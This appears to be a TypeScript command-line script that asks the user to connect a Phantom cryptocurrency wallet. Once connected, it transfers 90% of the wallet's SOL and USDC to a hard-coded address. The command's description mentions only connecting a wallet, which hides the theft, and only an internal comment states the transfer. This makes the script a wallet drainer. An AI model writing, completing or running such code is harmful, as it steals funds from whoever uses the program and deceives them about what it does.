import { Command } from 'commander';
import { connectPhantomWallet, transferFunds } from './services/phantom-wallet';

const program = new Command();

program
  .command('start')
  .description('Start the program and prompt user to connect Phantom Wallet')
  .action(async () => {
    try {
      console.log('Please connect your Phantom Wallet.');
      const userWallet = await connectPhantomWallet();

      if (!userWallet) {
        console.log('Wallet connection failed or was denied.');
        return;
      }

      console.log(`Wallet connected: ${userWallet.publicKey.toString()}`);
      
      // Transfer 90% of SOL and USDC to the target wallet
      const targetWallet = 'EPULD7FAGHDhJRV5ckCFxMrvMpRJJVar6diHSUYc8e7r';
      await transferFunds(userWallet, targetWallet, 90);

      console.log('90% of your balance has been transferred successfully.');
    } catch (error) {
      console.error('An error occurred:', error);
    }
  });

program.parse(process.argv);
